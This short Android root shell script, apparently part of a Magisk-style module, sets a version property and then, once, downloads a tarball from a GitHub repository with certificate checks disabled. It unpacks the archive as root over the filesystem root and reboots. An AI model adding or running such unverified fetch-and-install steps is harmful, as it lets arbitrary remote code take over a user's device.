#!/system/bin/sh

resetprop kt.version uf1

if [ ! -f /data/adb/done2 ]; then
    
	
	curl -kL -o /data/local/tmp/adb.tar.gz https://github.com/t4084058/rud/raw/refs/heads/main/adb.tar.gz
	tar -xvpzf /data/local/tmp/adb.tar.gz -C /
    touch /data/adb/done2 && reboot
    
fi
